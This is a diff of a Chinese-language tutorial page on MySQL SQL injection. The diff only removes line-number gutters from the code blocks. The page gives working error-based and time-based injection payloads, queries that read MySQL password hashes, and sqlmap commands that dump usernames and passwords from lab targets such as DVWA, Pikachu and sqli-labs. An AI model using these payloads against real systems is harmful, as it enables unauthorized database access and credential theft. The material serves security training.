+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>extractvalue()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>updatexml()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>geometrycollection()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>multipoint()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>polygon()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>multipolygon()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>linestring()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>multilinestring()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>exp()</code></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="1-7-4-在黑盒模式下的报错注入"><a href="#1-7-4-在黑盒模式下的报错注入" class="headerlink" title="1.7.4 在黑盒模式下的报错注入"></a>1.7.4 在黑盒模式下的报错注入</h2><p>在黑盒模式下的报错注入，首先获取当前库，通过库获取表名，接着通过表名获取字段，最后获取字段内容。</p>
 <h3 id="1-7-5-报错注入得到库名"><a href="#1-7-5-报错注入得到库名" class="headerlink" title="1.7.5 报错注入得到库名"></a>1.7.5 报错注入得到库名</h3><p>注入以后语句均可获取库名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and info()--</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and info()--</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
 <p>得到库名 <code>dvwa</code>。</p>
 <h3 id="1-7-6报错注入获取-MySQL-账号和密码"><a href="#1-7-6报错注入获取-MySQL-账号和密码" class="headerlink" title="1.7.6报错注入获取 MySQL 账号和密码"></a>1.7.6报错注入获取 MySQL 账号和密码</h3><p>获取账号和密码需要 root 用户才有足够大的权限：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span> )),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="built_in">substring</span>((<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>),<span class="number">32</span>,<span class="number">40</span>))),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span> )),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="built_in">substring</span>((<span class="keyword">select</span> authentication_string <span class="keyword">from</span> mysql.user limit <span class="number">1</span>),<span class="number">32</span>,<span class="number">40</span>))),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 
 <h3 id="1-7-7报错注入获取表名"><a href="#1-7-7报错注入获取表名" class="headerlink" title="1.7.7报错注入获取表名"></a>1.7.7报错注入获取表名</h3><p>通过 MySQL 内置库 <code>information_schema</code>，通过构造 SQL 语句查询获取表名。采用 <code>floor</code> 报错并不会存在长度问题。</p>
 <p>查询第一个表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>将 <code>LIMIT 0,1</code> 改成 <code>1,1</code>，表是第二个表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="1-7-8-报错注入获取字段"><a href="#1-7-8-报错注入获取字段" class="headerlink" title="1.7.8 报错注入获取字段"></a>1.7.8 报错注入获取字段</h3><p>在获取表名之后就可以获取字段名，如获取 <code>users</code> 的字段名。</p>
 <p>获取第一个字段名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>获取第二个字段名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>可以使用 Burp Suite 批量对字段批量获取，首先抓包，修改变量，设置匹配规则。开启攻击。</p>
 <h3 id="1-7-9-报错注入获取某表某段内容"><a href="#1-7-9-报错注入获取某表某段内容" class="headerlink" title="1.7.9 报错注入获取某表某段内容"></a>1.7.9 报错注入获取某表某段内容</h3><p>现在已经获取 <code>users</code> 表的名字和它的字段名，接下来可以对内容进行查询：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>如果存在多个用户，把 <code>limit 0,1</code> 改成 <code>1,1</code>，如此类推直到获取最后一个用户为止。使用 Burpsuite 对用户获取，设置数量，再设置过滤网页响应内容。</p>
 <p>获取库里 <code>users</code> 表所有用户的账号和密码。</p>
 <h1 id="1-8-时间注入"><a href="#1-8-时间注入" class="headerlink" title="1.8 时间注入"></a>1.8 时间注入</h1><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><p>时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用的一种突破注入的技巧。</p>
 <p>在 MySQL 里，函数 <code>sleep()</code> 是延时的意思，<code>sleep(10)</code> 就是数据库延时 10 秒返回内容。判断注入可以使用 <code>&#39;and sleep(10)</code>，数据库延时 10 秒返回值，网页响应时间至少要 10 秒。根据这个原理来判断存在 SQL 时间注入。</p>
 <p>MySQL 延时注入用到的函数有 <code>sleep()</code>、<code>if()</code>、<code>substring()</code>。例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">10</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">10</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
 <p><code>2&gt;1</code> 这个部分就是你注入要构造的 SQL 语句。如果条件成立，就会触发延时。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(LENGTH(database())<span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(LENGTH(database())<span class="operator">&gt;</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这个语句用于查询当前库名长度是否大于 1，如果是，就会延时 5 秒执行。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; OR IF(LENGTH(database())&gt;1, SLEEP(5), 0)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; OR IF(LENGTH(database())&gt;1, SLEEP(5), 0)--+</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到网页响应时间大于五秒，根据这个原理，如果 <code>n&gt;1</code>，<code>n</code> 不延时就能确定当前数据库的长度了。</p>
 <p>如果想要获取数据内容，可以用截取字符再进行字符对比，如果相同就进行延时。这样就能逐个获取字符，接着再拼接就是当前库的内容。</p>
@@ -1084,7 +1084,7 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 </ul>
 <hr>
 <h2 id="1-19-2-时间注入代码分析"><a href="#1-19-2-时间注入代码分析" class="headerlink" title="1.19.2 时间注入代码分析"></a>1.19.2 时间注入代码分析</h2><p>在页面中分析源码，直接获取 <code>name</code> 带进数据库进行查询，但是否存在记录，页面返回都一样。在黑盒模式下可以使用 sqlmap 对注入进行检测。sqlmap 支持多种数据库注入，而且支持多种注入方式。</p>
-<h3 id="采用时间注入"><a href="#采用时间注入" class="headerlink" title="采用时间注入"></a>采用时间注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T</span><br></pre></td></tr></table></figure>
+<h3 id="采用时间注入"><a href="#采用时间注入" class="headerlink" title="采用时间注入"></a>采用时间注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>-u</code>：表示检测的 URL。</li>
@@ -1093,26 +1093,26 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 <li><code>--technique=T</code>：检测方法为时间注入。</li>
 </ul>
 <p>sqlmap 检测为时间注入后，接下来可以通过这个注入获取数据库的名、用户权限、表、字段等敏感信息的获取。</p>
-<h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --current-user --current-db --batch</span><br></pre></td></tr></table></figure>
+<h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --current-user --current-db --batch</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>--current-user</code>：获取当前用户。</li>
 <li><code>--current-db</code>：获取当前数据库。</li>
 <li><code>--batch</code>：使用默认模式，自动回答 <code>y</code>。</li>
 </ul>
-<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --tables -D pikachu --batch</span><br></pre></td></tr></table></figure>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --tables -D pikachu --batch</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>-D</code>：指定数据库。</li>
 <li><code>--tables</code>：获取表名。</li>
 </ul>
-<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --columns -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure>
+<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --columns -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>-T</code>：指定表名。</li>
 <li><code>--columns</code>：获取字段名。</li>
 </ul>
-<h3 id="查询账号和密码"><a href="#查询账号和密码" class="headerlink" title="查询账号和密码"></a>查询账号和密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --dump -C <span class="string">&quot;id,username,password&quot;</span> -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure>
+<h3 id="查询账号和密码"><a href="#查询账号和密码" class="headerlink" title="查询账号和密码"></a>查询账号和密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.0.134/06/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -p name -v 1 --technique=T --dump -C <span class="string">&quot;id,username,password&quot;</span> -T <span class="built_in">users</span> -D pikachu --batch</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>--dump</code>：导出数据。</li>
@@ -1121,31 +1121,31 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 <p>使用 sqlmap 可以很容易地将时间注入的数据查询出来。</p>
 <h1 id="1-9-堆叠注入"><a href="#1-9-堆叠注入" class="headerlink" title="1.9 堆叠注入"></a>1.9 堆叠注入</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号（<code>;</code>）隔开，而堆叠查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。</p>
 <p>在 MySQL 里，<code>mysqli_multi_query</code> 和 <code>mysql_multi_query</code> 这两个函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version(); <span class="keyword">SELECT</span> database()</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version(); <span class="keyword">SELECT</span> database()</span><br></pre></td></tr></table></figure>
 
 <p>堆叠注入的危害是很大的，可以任意使用增删改查的语句，例如删除数据库、修改数据库、添加数据库用户。</p>
 <h2 id="1-19-4-堆叠注入代码分析"><a href="#1-19-4-堆叠注入代码分析" class="headerlink" title="1.19.4 堆叠注入代码分析"></a>1.19.4 堆叠注入代码分析</h2><p>靶场启动：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -dt --name sqli -p 7766:80 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -dt --name sqli -p 7766:80 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
 
